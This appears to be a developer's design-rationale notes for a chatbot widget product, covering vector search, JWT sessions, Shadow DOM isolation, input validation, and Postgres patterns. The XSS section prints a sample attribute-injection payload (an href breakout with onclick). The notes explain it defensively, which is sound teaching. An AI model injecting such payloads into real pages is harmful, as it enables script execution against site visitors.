A B-tree index is built for ordered scalar comparisons (`WHERE x > 5`). Vector similarity is fundamentally different: we're asking "find rows nearest this query point in 1536-dimensional space" - there's no useful ordering to scan along. Brute force would require computing cosine distance against every row in the table (`SELECT … ORDER BY embedding <=> $1 LIMIT 5` without an index does exactly this). For 50 chunks it's fine; for 5 million it's death. HNSW (Hierarchical Navigable Small World) is an _approximate_ nearest-neighbor index that builds a multi-layer graph of vectors where each vector is connected to its closest few neighbors at each layer. Query time, you start at the top sparse layer, hop to the nearest neighbor, descend a layer, hop again - the algorithm converges on the top-k nearest vectors in roughly log(N) hops instead of N comparisons. The trade-off is "approximate" - HNSW might miss the true #1 nearest vector in rare cases, returning a slightly less-optimal one instead. For RAG retrieval this is invisible (top-5 vs top-5-with-one-rank-off doesn't change which chunks the model sees). The two tuning knobs - `m` (graph connectivity, default 16) and `ef_construction` (build-time search width, default 64) - trade index size and build time for recall quality. The pgvector defaults are well-chosen for our scale; we don't tune them.

> Why filter the similarity threshold in JavaScript instead of in the SQL `WHERE` clause?

Because mixing a threshold predicate with an `ORDER BY embedding <=> q LIMIT k` confuses the HNSW query plan. The index is built to return approximate nearest neighbors in order, but adding `WHERE (1 - (embedding <=> q)) >= 0.5` forces the planner to either (a) post-filter every approximate neighbor it walks until it finds enough that pass the threshold (slow, unpredictable), or (b) fall back to a sequential scan to evaluate the predicate against every row (defeating the index entirely). The clean pattern is: let the index do exactly what it's good at - `ORDER BY <=> q LIMIT k` to get the top-k candidates fast - then evaluate the relevance threshold in JavaScript against the tiny returned set. We lose the (small) optimization of letting Postgres skip already-too-distant rows, but we gain a deterministic, index-using plan that's resilient to data distribution changes.

> Why is the embedding key INTENTIONALLY separate from the chat key? Couldn't we just reuse the same OpenAI key for both?

This is a UX decoupling, not a security one. The product premise is BYO-key - users supply their _chat_ provider's key (Anthropic, OpenAI, Google, Azure). For Anthropic users (the default), forcing them to also have an OpenAI account just to enable semantic search would gate the feature behind a second signup. By splitting the two keys: an Anthropic user can opt into RAG by adding an OpenAI key, OR skip RAG entirely (falling back to the Stage 2 full-context path) with no penalty. The keys live in separate localStorage slots (`probot.llm.key.v1` and `probot.embedding.key.v1`) so toggling chat providers never wipes the embedding key. Implementation-wise, the chat route reads them from separate headers (`x-llm-api-key`, `x-embedding-api-key`) and never logs either. The security model is identical for both - localStorage-only, header-only transport, key-shaped strings never written to disk - but the UX is that one is required and one is optional.

> Why does the chat route silently fall back to full-context when retrieval fails, instead of returning a 5xx?

Because the user experience priority is **chat must keep working**. Retrieval can fail for a dozen reasons - OpenAI account hit a rate limit, embedding model was deprecated, pgvector extension somehow got disabled, the stored vectors are 1536d but the index was built for 768d, the query embedding network call timed out. In each case the bot _could_ still answer using the legacy full-context path (`bots.context_text`), which contains all the same source material the embeddings were derived from. Returning 500 to the user would make the entire chat unusable, when graceful degradation is right there. The trade-off this introduces is **silent quality regression**: a recruiter might get a worse answer than they should, with no visible signal that the system is in degraded mode. The fix is making the failure observable on the _operator_ side - the warn log carries the error category (`{ provider: "openai", category: "rate_limit", … }`) so a properly-instrumented production monitor (Sentry, Datadog) can alert on these without involving the user. The chat path itself stays clean.

> Why is the embedding error returned as `EmbeddingError.category` (e.g. `"invalid_key"`) instead of the raw message?

Two reasons. First, **key safety** (same principle as `ProviderError.toJSON()` covered earlier) - SDK error messages can carry the request headers in their `.message` property, and the BYO key rides in those headers. Even if today's OpenAI SDK doesn't do this, the contract should never depend on a downstream library's discretion. The category enum (`invalid_key | rate_limit | dimension_mismatch | empty_input | unknown`) is small, fixed, and known-safe by construction. Second, **client UX consistency** - the UI's switch statement maps `"invalid_key"` → "Your OpenAI key looks wrong" and `"rate_limit"` → "Your OpenAI account is being throttled," with localized strings under the developer's control. If we passed through SDK strings, a model rename in the OpenAI SDK could break the UI overnight. The route is the trust boundary; whatever it returns, the client treats as canonical.

---

### Why JWT-Backed Sessions Need DB Reads To Stay Fresh (Stage 4)

> NextAuth's JWT strategy is supposed to be the fast, stateless option. Why did we add a DB query to the `jwt` callback on every request? Doesn't that defeat the point?

The advertised benefit of JWT sessions is that the server can validate a request without touching the database - the cookie is signed, you verify the signature, you trust the payload. That's true for fields that never change after the JWT is minted (`user.id`, `email_verified` at a given timestamp). It is NOT true for fields the user can mutate after the JWT was issued. Username is the canonical example: the onboarding PATCH updates `users.username` in the database, but the JWT cookie sitting in the browser still encodes the old `user-<8hex>` placeholder. The session decode (which never reads the DB) hands the server the stale value. Result: the user PATCHes successfully, gets redirected to `/dashboard`, the dashboard layout reads `session.user.username` from the JWT, sees the placeholder, and bounces them back to `/onboarding`. Infinite loop. The fix is to make the `jwt` callback re-read the mutable field from the DB on every mint - converting "every request is a JWT decode" to "every request is a JWT decode + one DB query." That sounds expensive but the query is `SELECT username FROM users WHERE id = ?` against a primary key - sub-millisecond on Postgres, easily cached. The architectural lesson is: **JWT sessions are great when the data they encode is immutable for the JWT lifetime.** Anything mutable belongs in a per-request lookup, and you can either (a) re-read it in the callback like we do, (b) use a database session strategy where the cookie just stores a session ID and the lookup happens for every field, or (c) keep the JWT-fast path for immutable claims and only do the DB read for mutable ones via a separate code path. Option (a) is the cheapest correctness fix; option (c) is what you'd build at scale.

> Why force a `window.location.href = "/dashboard"` instead of using `router.push("/dashboard")` from the onboarding form?

`router.push` is a client-side navigation - it never refetches the JWT cookie. The browser still has the old cookie sitting in its jar; Next.js doesn't issue a new server-side request just because the URL changed. That means after a successful PATCH, `router.push` would shuttle the user to `/dashboard` with the SAME stale JWT still in play. The dashboard layout would still see the placeholder username. We fix this by forcing a full page navigation via `window.location.href`, which kicks the browser into making a fresh HTTP request that runs through the `jwt` callback again. The callback (per the fix above) re-reads the username from the DB and mints a new token. The dashboard layout then sees the real username and renders. Two architectural patterns at play: **session mutations require a server round-trip to take effect**, and **`router.push` is for client-side state, full reloads are for server-side state.** This isn't NextAuth-specific - same pattern applies to any JWT-backed system (Auth0, Clerk's session tokens, etc).

---

### Why The Onboarding Form Lives In A Server Component With A Client Sub-Tree (Stage 4)

> The `/onboarding` page does a server-side session check, then renders a client component for the form. Why not just make the whole page a client component and check the session via `useSession`?

Two reasons, both about closing redirect-loop classes. First, **server-side gating fails fast**: a user with a real (non-placeholder) username who navigates to `/onboarding` directly gets a server-side `redirect("/dashboard")` before any JavaScript loads. Client-side `useSession` would render the full form skeleton, then bounce them after hydration - a visible "flash of unauthorized content." For a page whose entire purpose is gating, the server check is the right tool. Second, **`useSession` data lags the server**: `useSession` reads from the `SessionProvider` context, which is populated from the JWT cookie at hydration time. On the very first render after sign-in, this is the same JWT the server saw, so `session.user.username` matches. But it can also race with `next-auth/react`'s refresh logic - there's a window where `status === "loading"` and you can't make a routing decision. Server-side `getServerSession` is synchronous from the request's perspective: by the time the page renders, the session is fully resolved. **The general pattern is: gate on the server, interact on the client.** The page component handles "are you allowed to be here?" (server). The form component handles "what do you want to change?" (client). The split keeps each layer doing what it's best at, and avoids the "did the client-side check finish yet?" race entirely.

---

### Why The Avatar Allowlist Has An "OR Equals Current" Escape Hatch (Stage 4)

> The onboarding PATCH validates that the submitted image URL is either in the curated `ANIMAL_AVATARS` list OR equal to the user's current `users.image`. Why the second branch? Doesn't that let users submit arbitrary URLs?

The "or equals current" clause is what makes the allowlist work for OAuth users. Picture an OAuth signup flow: Google says "this user's email is jane@example.com and their photo is https://lh3.googleusercontent.com/...". The NextAuth adapter writes that URL into `users.image`. Jane now lands on `/onboarding` to pick a real username. The avatar grid shows the 13 animals plus her Google photo as a first "Keep current" card. She picks "Keep current" → submits with `image = "https://lh3.googleusercontent.com/..."`. That URL is not in our curated list. If we ONLY checked the allowlist, the PATCH would reject and Jane is forced off her real photo. The "or equals current" branch says: the user can keep whatever they already have, but they cannot inject anything new. The security guarantee is that **the only way to get a non-allowlisted URL into `users.image` is via the NextAuth adapter at signup time** - and we trust that path because it's the OAuth provider's own data. Once the OAuth photo is in the DB, the user can keep it forever (by re-submitting the same value) but cannot replace it with a different non-allowlisted URL. The "current" comparison is read from the DB using the session's userId, so a user cannot spoof someone else's `image` value by submitting it - the comparison is always against THEIR row, never the body of the request. The general principle: **allowlists with a "preserve existing value" exception let you tighten future writes without breaking past writes that were trusted at the time**. It's a common pattern in any system that adds validation after the fact (the "grandfather" clause). Implementation detail: the comparison is `parsed.data.image === existing.image`, NOT a substring check or a URL parse - strict equality means an attacker can't squeeze in extra query params or fragments.

---

### Why React `cache()` Pairs Server-Components With `generateMetadata` (Stage 4)

> The chat page's `resolve()` helper is wrapped in `cache()`. What does that actually do, and why is the chat page the right place for it?

Next.js calls `generateMetadata` and the page component as two separate function invocations during the same render. If both call `resolve("jane-doe")` independently, you get 4 DB queries (2 for metadata + 2 for the page). React's `cache()` is a memo at request scope - within a single render pass, the wrapped function returns the same Promise for the same arguments, no matter how many call sites invoke it. So the second `resolve()` call hits the cache and returns instantly, dropping you from 4 queries to 2. The cache is scoped to one request, so user A's data never leaks to user B; it just deduplicates within the request boundary. **The cache key is the function arguments**, so `resolve("jane-doe")` and `resolve("alex-chen")` are independent entries. Why is this the right place? Two reasons. First, the data is **strictly idempotent per request** - username → bot doesn't change while the request is being served. Second, the call sites are **structurally independent** but **semantically identical** - the metadata function and the page function both need the same data, but neither can elegantly pass it to the other (Next.js doesn't expose a shared context for this). `cache()` lets you write the helper once and use it from anywhere without worrying about the call count. The gotcha is that `cache()` only works WITHIN React's request boundary - calling the wrapped function from a non-React context (a util used in middleware, say) does NOT benefit. For those, you need explicit memoization (e.g., a `WeakMap` keyed by request).

---

### Why Cache-Control On The Public Config API Is A Rate-Limit Substitute (Stage 4)

> The code review flagged that `/api/bots/[botId]/config` has no rate limit. The fix added `Cache-Control: public, s-maxage=60, stale-while-revalidate=300`. How does a cache header replace a rate limit?

It doesn't fully replace it - but it changes the economics enough to defer the proper fix. Here's the model. Without the header, every GET to `/api/bots/<id>/config` hits the origin server, which runs two DB queries. An attacker can hammer the endpoint at full bandwidth, racking up DB load proportional to their request rate. With `s-maxage=60`, a CDN in front (Vercel's edge, Cloudflare, whatever) caches the response per botId for 60 seconds. The first request for a given botId hits origin; the next thousand requests within 60s hit cache and never touch the database. The attacker can still send unlimited requests, but their per-second damage to the origin is capped to (unique-botIds × 1/60). For a brute-force enumeration of UUID-shaped botIds, the cache is doing 99.99% of the rate-limiting work. `stale-while-revalidate=300` extends the win: even after 60s, the cache returns the stale value for 300 more seconds while it revalidates in the background, so the bot owner sees their edits within 60s but the origin protection extends out to 6 minutes for stale-tolerant requests. **What this does NOT solve**: a targeted attack on a single known botId still gets through (the cache helps but doesn't stop scraping that specific bot's data once). For that you need a per-IP token bucket (Stage 7 with Redis). **What it DOES solve**: opportunistic enumeration attacks, which are the realistic threat model for a public-by-default endpoint. The general lesson: **HTTP caching is the cheapest rate limit you'll ever ship for idempotent GETs**. Reach for it before reaching for a full rate-limit library; reach for the library when the cache stops being enough.

---

### Why A CHECK Constraint On `messages.role` Belongs In Postgres, Not Just TypeScript (Stage 4)

> Drizzle already enforces the column type, and TypeScript can constrain the role to `'user' | 'assistant' | 'system' | 'tool'` at the call site. Why add a CHECK constraint at the database level?

Defense-in-depth at trust boundaries. The TypeScript type only constrains code that goes through Drizzle's typed insert API. A future migration script, a `psql` console, a backfill written in Python, a webhook-driven write from a different service - any of these can bypass the TypeScript checker entirely and write garbage to `messages.role`. The cost of that garbage shows up in Stage 6 analytics: imagine grouping by role and discovering 0.3% of messages have `role = "assitant"` (typo) which inflates your `system`-bucket count or just gets silently dropped. By the time you notice the drift, the data is corrupted across millions of rows and you can't easily recover the intended value without re-running the original code path. The CHECK constraint says: **whatever path writes to this column, the database refuses values outside the allowed set**. It's the same logic as putting a UNIQUE constraint on `users.email` even though your registration code already pre-checks - the constraint is your last line of defense when application code has a bug or a race. The "now is free, later is expensive" property is critical: adding the constraint to an empty table is one ALTER statement; adding it to a populated table after Stage 6 ships requires either (a) a full table scan to validate existing rows, or (b) a `NOT VALID` constraint that needs a separate `VALIDATE CONSTRAINT` once you've cleaned the data. Both are painful and visible. The five-minute investment now buys total protection forever.

---

### Why The Widget Runs Inside A Shadow DOM (Stage 5)

> The embeddable widget gets pasted into any portfolio site - `janedoe.com`, `acme.dev`, `portfolio.io`. Why isolate it in a Shadow DOM instead of just rendering a `<div>` with scoped CSS?

The host page's CSS is hostile to your widget by default. Not in a malicious way - just because the host owner wrote `* { box-sizing: border-box; }` six years ago, or they use Tailwind preflight, or they have an aggressive reset that sets `button { background: none; border: 0; }` and now your widget bubble has no shape. Every CSS rule on the host page is competing with yours. Worse, the host's CSS might use higher specificity selectors than yours, so even `!important` doesn't reliably win. Plain scoped CSS (BEM-named classes like `.probot-bubble`) helps but does not prevent: (a) the host's `*` selector, (b) the host's element-level rules (`button`, `a`, `img`), or (c) specificity battles. Shadow DOM solves all three with one mechanism: **a Shadow root is a CSS encapsulation boundary**. Selectors inside the shadow tree do not match elements outside, and rules outside do not match elements inside. Your widget is rendered in a parallel universe where the host's CSS literally cannot reach it. The `attachShadow({ mode: "closed" })` flag is a second layer: it also blocks the host page's JavaScript from querying into your widget's DOM via `host.shadowRoot` (which would be `null`). That stops a script on the host page from doing `document.querySelector("[data-probot-widget]").shadowRoot.querySelector(".probot-bubble").click()` to drive your UI programmatically. Open mode would expose `shadowRoot`; closed mode is the right choice for a widget that needs visual and behavioral integrity on hostile pages. The lesson: **isolation is not "scoped CSS classes" - it's a boundary the browser enforces**. Anytime you're shipping UI that runs on someone else's page, default to Shadow DOM.

> Why does the build step inline CSS as a JavaScript string constant instead of `<link>`-ing it from a CDN?

Three reasons. **Latency:** a `<link>` would force a second network round-trip after `widget.js` loads. The bubble would render with no styles for the duration of that round-trip, producing a visible flash. Inlining the CSS means the widget renders fully-styled in one network request. **Origin friction:** the host page (`janedoe.com`) and the widget CSS host (`pro-bot.dev`) are different origins - cross-origin stylesheets work but every CORS misconfiguration on either side breaks the widget. Inlining sidesteps the whole CORS surface for the styles. **Cache poisoning:** if the widget.js bundle and the CSS file are versioned independently and the user has an old widget.js in their browser cache fetching a new CSS file, you get visual inconsistencies. Inlining locks the JS and CSS together - they ship as one artifact, you never have skew. The cost is bundle size: 3 KB of CSS adds 3 KB to the JS. At our scale (8 KB total widget) this is invisible; at 500 KB it might matter. For now, inlining wins on every dimension.

---

### Why `encodeURIComponent` Is NOT A Substitute For HTML Escaping (Stage 5)

> The widget builds `chatUrl = \`${apiBase}/u/${encodeURIComponent(owner.username)}/chat\``and inserts it into an`href`. The code reviewer flagged this as an XSS bug. The username IS encoded - what's missing?

Two different escape contexts, two different functions. `encodeURIComponent` is for **URL path/query encoding**: it converts characters that have special meaning in a URL (spaces, slashes, ampersands, question marks) into percent-encoded equivalents (`%20`, `%2F`, etc.). It produces a string that, when concatenated into a URL, won't break the URL's grammar. **HTML attribute escaping** is a different problem: it converts characters that have special meaning inside an HTML attribute value (`<`, `>`, `&`, `"`, `'`) into HTML entities. A string like `https://x" onclick="alert(1)` is a perfectly valid URL - `encodeURIComponent` won't touch it because none of those characters need URL escaping. But when you splice it into `<a href="${url}">`, the embedded quote terminates the `href` attribute and the rest of the string is parsed as additional HTML attributes. Now you have an XSS. The general rule: **the escape function must match the context the value is being inserted into**. Database queries → parameterized queries (or context-specific escaping per dialect). Shell commands → shell-quote. HTML text content → text-escape `<>&`. HTML attributes → also escape `"` and `'`. URLs → percent-encode. SVG → its own set. Mixing them up is one of the most common XSS sources in real systems, because the code "looks safe" - there's a sanitizer call, it's just the wrong sanitizer. The widget fix wraps the URL in `escapeHtml(chatUrl)`. That's chained escaping: `encodeURIComponent` for the path segment, then `escapeHtml` for the attribute context. Both are needed because each handles a different vulnerability class. The lesson: **when you see a value flowing into a different output context (URL → attribute, text → URL, JS → HTML), check the escape function changes with the boundary**.

---

### Why Mass-Assignment Defense Is A Schema, Not A Filter (Stage 5)

> `PATCH /api/bots/[botId]` accepts a Zod-validated `botPatchInput` that whitelists only `themeColor`. Why not just do `delete body.userId; delete body.isActive; await db.update(bots).set(body)`?

Three reasons the schema approach is structurally safer. **Whitelist beats denylist:** a `delete body.userId` only catches the fields you remembered to forbid. Tomorrow someone adds a new column to the `bots` table - `customDomain`, say - and the denylist silently doesn't know about it. A schema goes the other way: the SET payload is built ONLY from fields the schema names. Forgetting to add a new field to the schema means the field is silently ignored, not silently accepted. **Type system enforcement:** when the SET object is built from `parsed.data`, TypeScript can narrow the keys to the schema's keys. A bug where you accidentally pass `body.userId` doesn't compile. With a delete-based filter, the SET object's type is `Partial<Bot>`, which permits any column. **Auditability:** the schema declares "PATCH allows ONLY these fields" in one place that's grep-able by name. The denylist version requires reading the controller code to know what's accepted. Six months from now when a security audit asks "can a user PATCH their own `userId`?", you point at `botPatchInput` and the answer is binary. With the filter version, you have to trace control flow. The pattern generalizes: **for any endpoint that accepts a structured payload, the surface area should be defined by a schema declaration, not by ad-hoc filters**. The schema is the contract; the filter is a habit that breaks when you're tired.

> The schema has `.refine((value) => Object.values(value).some((v) => v !== undefined))`. Why force at least one field? An empty PATCH should just be a no-op, right?

It should - but distinguishing "the client intentionally sent an empty body" from "the client's PATCH had a typo that made every field undefined" is harder than blocking empty bodies entirely. An empty SET payload also triggers a Drizzle SQL error (`UPDATE … SET WHERE …` is not valid SQL). The 400 response with a clear "PATCH body must include at least one field" is more useful to the client than a 500 from a SQL syntax error. The refine catches both the intentional-empty case (return clear error, no DB call) and the typo case (return clear error pointing the user at their broken payload). Costs nothing, prevents two bug classes.

---

### UPSERT With Atomic Counter Increments (Stage 6 Slice 6.1)

> The chat orchestrator does `INSERT INTO conversations (...) ON CONFLICT (bot_id, session_id) DO UPDATE SET message_count = conversations.message_count + 2, last_message_at = NOW()`. Why an UPSERT instead of "SELECT then INSERT or UPDATE"?

The naive "check-then-act" pattern is a classic concurrency bug. Imagine two browser tabs from the same recruiter on the same bot, both submitting a chat message in the same 50 ms window. The flow is: tab A `SELECT WHERE bot_id=? AND session_id=?` → empty → tab A decides to INSERT. Meanwhile tab B does the same SELECT → empty (A's INSERT hasn't committed yet) → tab B also decides to INSERT. Both INSERTs hit the database; the unique index `(bot_id, session_id)` rejects the second one. Now you have a 500 error on tab B because of a race, not a bug. UPSERT collapses the check and the write into a single atomic statement: Postgres acquires the row-level lock on conflict, applies the UPDATE branch, and the SET expression `message_count = conversations.message_count + 2` operates on the **post-lock** value, so concurrent UPSERTs serialize cleanly. Two tabs racing → first one creates the row with `message_count = 2`, second one updates to `message_count = 4`. No 500, no lost write, no manual retry logic. **The general pattern**: any "increment a counter scoped to a key" use case wants `INSERT ... ON CONFLICT DO UPDATE SET counter = table.counter + 1`, not SELECT + branch. Same shape covers rate counters, view counts, last-seen timestamps, retry attempts, lead-capture counts. The expression on the right-hand side of SET refers to the existing row column qualified by the table name (`conversations.message_count`) so it reads the committed-pre-conflict value within the same transactional window. **What this fails for**: counters with side effects (e.g., "increment AND charge the user $X") - those need a transaction wrapping a SELECT FOR UPDATE because the side effect is not part of the UPSERT. For pure counter math, UPSERT is the right tool.

> Why does the same transaction insert the messages right after the upsert? Couldn't they be two separate calls?

Two separate calls open a window where the conversation row exists but the messages don't. If the second call fails (network blip, pool exhaustion, app crash mid-request), the dashboard now shows a conversation row with `message_count = 2` and zero messages - a broken state that nothing detects, nothing repairs. Wrapping both writes in `db.transaction(async (tx) => ...)` makes the writes atomic at the Postgres level: either both commit, or both roll back. The dashboard never sees a half-written conversation. The cost is a tiny bit of transaction overhead (one BEGIN + one COMMIT instead of two autocommit statements). For every "row + its children" pattern - orders + line items, runs + steps, conversations + messages - the transaction is the line between "rare bug we'll spend a Wednesday afternoon investigating" and "structurally impossible state."

---

### Anonymous Session Identity Without Cookies (Stage 6 Slice 6.1)

> The public chat at `/u/<username>/chat` is no-auth - recruiters are anonymous. How does the backend group multiple chat turns into a single "conversation" if there's no user account?

The trick is a client-side session token that is opaque to anyone except the server's analytics tables. On first chat-page mount, the browser checks `sessionStorage.getItem('probot.chat.sessionId')`. If empty, generate a v4 UUID and persist it back to `sessionStorage`. Every subsequent chat request in the same tab includes that UUID in the request body. The server UPSERTs a `conversations` row keyed by `(bot_id, session_id)`, so all turns from one tab coalesce into one analytics record. **Why `sessionStorage` specifically, not `localStorage` or a cookie?** Each has different semantics: `localStorage` persists across tabs and across browser restarts - too sticky. A recruiter visits today, comes back six months later for a different role: those should be two conversations, not one with a six-month gap. `sessionStorage` clears when the tab closes - perfect for "one visit = one conversation". A cookie would also work but carries baggage: cookies trigger consent banners under GDPR (every Stage 7 task you don't want to fight today), are sent with every request to the origin (bandwidth cost), and require a Set-Cookie header on the chat endpoint (server-side complexity). `sessionStorage` is purely client-managed, has no compliance footprint, costs zero bytes per request you don't need. **The generalizable pattern**: when you need stable identity scoped to a thing-not-an-account (a visit, a workflow step, a checkout session, an analytics funnel), reach for `sessionStorage` first. The token never leaves the client, the server never persists it as "user", and the privacy story is "this UUID identifies the conversation, not the person." If you later need cross-visit continuity, you escalate to `localStorage`; if you need cross-device, you escalate to a real account.

> The server validates `sessionId: z.string().uuid()`. Why force UUID format if it's just a key?

Two reasons. **Defense in depth**: the column is `varchar(255)`, so without the UUID check a misbehaving client could send a multi-kilobyte string and burn database row size on every UPSERT. The UUID regex caps the length implicitly and rejects garbage. **Index efficiency**: the unique index on `(bot_id, session_id)` is btree. Fixed-width UUID-shape strings index cleanly. Variable-length arbitrary strings still index, but each lookup involves more comparison work and pages span fewer rows. The format check is free (a regex match), and it locks the contract: clients must send UUID-shape strings, full stop. If we later move to a different ID scheme, we change one regex and the contract changes with it; no leaked-string-format bugs from legacy clients.

---

### Why Persistence Errors Get A Warn, Not A Throw Or A Silent Swallow (Stage 6 Slice 6.1)

> The chat orchestrator's persistence block ends with `} catch (err) { console.warn("[chat] conversation persistence failed", err); }`. Why a warn? An empty catch would be simpler, and a re-throw would surface the error.

This is the "primary-value-vs-secondary-value" tradeoff, applied at runtime. The chat reply is the user's primary expectation: they typed a message, they need a response. Persisting that turn to the `conversations` and `messages` tables is secondary: it powers the bot owner's dashboard, but the recruiter doesn't see it, and the chat is fully functional without it. If the database pool is exhausted or a migration hasn't run, throwing the error breaks the chat for an unrelated reason - the recruiter sees "internal error" and the bot owner loses the lead entirely. Worse: the recruiter never knew there was a backend persistence layer, so the user-facing failure is incomprehensible. Swallowing silently solves the user-facing problem but creates a new one: a misconfigured production database fails persistence on every chat without any signal. The first the bot owner hears about it is "why is my dashboard empty?" - days or weeks after the regression. `console.warn` is the cheap middle path. The reply still ships (primary value preserved), the error appears in the server logs (operators have a signal), and the structured-logger upgrade in Stage 7 will replace the `console.warn` call site without changing the control flow. **The generalizable rule**: when a non-critical side effect can fail, the catch should always log. Empty catches and silent swallows are technical debt that compounds - every `catch {}` you ship is one harder bug to find when something goes wrong. The cost of a log line is zero; the cost of a missing log line during a 2 a.m. incident is hours.

> The reviewer flagged the original `catch {}` as HIGH severity. Why HIGH and not MEDIUM?

Severity in code review tracks impact-on-production-incident, not impact-on-correctness. A silent swallow with no logging is a unique failure class: the bug is invisible. Other HIGH-severity bugs (missing input validation, wrong status code, etc.) at least give you an error to grep for; silent swallows give you nothing - no log line, no metric, no exception trace. The only way to discover them is "user reports X is broken, you spend hours instrumenting the code path to find out the data was being silently dropped at line 282." The actual code change (add a `console.warn`) is trivial, but the principle - never ship an invisible failure path - is structural. Even a `console.warn` is a placeholder; the right answer is a structured logger feeding alerting. But the floor is "at minimum, leave a breadcrumb."

---

### Partial Indexes For Hot Sub-Queries (Stage 6 Slice 6.1)

> The notifications table has `CREATE INDEX notifications_user_unread_idx ON notifications (user_id, created_at DESC) WHERE read_at IS NULL`. Why the WHERE clause inside the index definition?

Postgres supports **partial indexes** - indexes that only include rows matching a predicate. The bell-badge query is `SELECT COUNT(*) FROM notifications WHERE user_id = ? AND read_at IS NULL`. A typical full index on `(user_id, created_at)` would include every notification row ever - read or unread. Over a year of usage, a bot owner accumulates thousands of read notifications; the unread count query scans the index pages for that user, filters by `read_at IS NULL` in memory, and returns a small number. The partial index inverts this: it includes ONLY rows where `read_at IS NULL`. The index is tiny (the size of "currently unread notifications," typically <50 rows per user), and the unread-count query becomes a near-instant index-only scan on the matching subset. **The win is two-dimensional**: smaller index = less RAM cache footprint, less disk I/O on lookup; pre-filtered subset = no per-row WHERE evaluation. **The cost is one-dimensional**: when a row's `read_at` changes from NULL to a timestamp (marking it read), Postgres removes the row from the partial index. That's the same write cost as a regular index but slightly more bookkeeping. For "the hot read is a subset of the rows" patterns - unread items, active sessions, pending tasks, failed jobs - partial indexes are usually a strict win. **The general rule**: if a query has a `WHERE x = ? AND <predicate>` shape, and `<predicate>` is satisfied by a small fraction of all rows, the partial index `WHERE <predicate>` is cheaper than the full index. The predicate becomes part of the data structure instead of part of the query plan.

> The `messages.role` and `notifications.kind` columns both have CHECK constraints (e.g., `CHECK (kind IN ('lead_captured'))`). Why enforce at the DB level when the application-level Zod schemas already validate?

Defense in depth, but also defense across time. The Zod schema validates inputs from the HTTP boundary right now. Six months from now, someone writes a one-off SQL migration script to backfill notifications for old leads - and they type `'leads_captured'` (plural) by accident. The Zod check is irrelevant; the migration script doesn't go through Zod. The DB-level CHECK turns the typo into an instant INSERT failure with a clear error message. Same protection applies to direct psql connections, database admin tools, and any future ETL pipeline. **The principle**: validation should live as close to the data as possible. Application code is one layer; the database is the floor. Locking shapes at the DB level means the only way to insert invalid data is to drop the constraint first - which is loud, audited, and intentional. The CHECK constraint cost is essentially nothing (Postgres evaluates it on each write but the predicate is trivial), and the bug it prevents is the kind that silently corrupts analytics for weeks before someone notices.

---

### Cryptographic Randomness In Identifier Fallback Paths (Stage 6 Slice 6.1)

> The session-id store's UUID fallback originally used `Math.random()`. The reviewer flagged it as MEDIUM. Why does randomness quality matter in a fallback that's almost never reached?

Two reasons that compound. **The fallback path is exactly where the attacker arrives.** The primary path (`crypto.randomUUID()`) runs on every modern browser and Node runtime. The only environments that exercise the fallback are unusual: very old WebViews, certain embedded browsers, certain corporate sandbox configurations. Those are also the environments most likely to be running on jailbroken phones, kiosks with shared sessions, or hostile networks - the demographic where the worst-case threat model lives. The "extremely unlikely" path is, in adversarial conditions, the most likely path. **`Math.random()` is not adversary-resistant.** It uses a fast deterministic PRNG (typically xorshift128+ in modern V8). Given a small number of consecutive `Math.random()` outputs, you can recover the internal state and predict the next outputs. For a UUID composed of 122 effective random bits, an attacker who can observe one or two UUIDs from a session can predict subsequent ones with reasonable probability. In our case, predicting another recruiter's sessionId lets you forge a UPSERT key - pollute their conversation row, inject fake `messageCount` increments, even (in Stage 6.4) attach a fake lead to their conversation. The actual impact is bounded (metric pollution, not data exfiltration), but the principle generalizes. **The fix is `crypto.getRandomValues`**, which is available wherever any `crypto` namespace exists - older even than `crypto.randomUUID`. It writes cryptographically random bytes into a typed array; you then assemble those into UUID shape with explicit version-4 and variant-10xx bit-setting per RFC 4122. The code is 6 lines vs. 1, but the randomness is uniform and unpredictable. **The lesson**: any identifier that gates access or authentication-adjacent behavior - session IDs, password reset tokens, CSRF tokens, OAuth states, signed URLs, idempotency keys - needs cryptographic randomness in every path, including fallbacks. `Math.random()` is fine for jitter, shuffle, animation seeds, A/B test bucketing. It is not fine for anything an attacker can benefit from guessing.

> Why the bit manipulation at the end - `bytes[6] = (bytes[6] & 0x0f) | 0x40` - instead of just using the random bytes raw?

UUID format is not just "16 random bytes." RFC 4122 specifies that version-4 UUIDs have specific bits in specific positions: byte 6's high nibble must be `0100` (the version-4 marker), and byte 8's high two bits must be `10` (the variant-10xx marker). These bits are how the format declares "I'm a v4 UUID, generated by a random source." A consumer parsing the UUID can check those bits to validate the format. The Zod check on the server side uses a regex that, among other things, enforces these positions (`/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i` - note the `-4` in the middle and `[89ab]` after). Random bytes have a 1-in-256 chance of matching the v4 bit pattern by coincidence; without the bit-fixing, the fallback would generate format-invalid UUIDs that the server's Zod check rejects ~99.6% of the time. The bit manipulation is the difference between "random bytes" and "RFC-compliant v4 UUID." The `& 0x0f | 0x40` formula clears the existing high nibble and sets it to `0100`; `& 0x3f | 0x80` clears the high two bits and sets them to `10`. Both operations preserve the entropy of the other bits - you lose 6 bits of randomness in exchange for format conformance. 122 effective random bits is still ~5.3 × 10^36 distinct values; collisions are not a concern.

---

### LATERAL Subqueries Over Per-Row Round-Trips (Stage 6 Slice 6.2)

> The conversations list endpoint needs each row to carry a 200-char preview of the first user message. A naïve implementation fetches the conversation rows, then loops in JS firing one `SELECT FROM messages` per row. The dashboard rendering 50 conversations would burn 51 round-trips. What's the SQL-native fix?

A **LATERAL subquery** (technically: a correlated subquery used as a scalar inside SELECT) lets Postgres run "for each conversation row, fetch its first user message" in a single query plan. The shape in Drizzle's `sql` template is:

```ts
const FIRST_USER_MESSAGE_SQL = sql<string | null>`(
  SELECT LEFT(${messages.content}, 200)
  FROM ${messages}
  WHERE ${messages.conversationId} = ${conversations.id}
    AND ${messages.role} = 'user'
  ORDER BY ${messages.createdAt}
  LIMIT 1
)`;
```

That subquery references the outer `conversations.id`, which makes it correlated - Postgres re-evaluates it per outer row. With the composite slice-6.1 index `messages_conv_created_idx` on `(conversation_id, created_at)`, each evaluation is a sub-millisecond index scan returning at most one row. 50 rows × 50 micro-scans = ~5 ms total, versus 51 round-trips × 5 ms network = 255 ms in the naïve version.

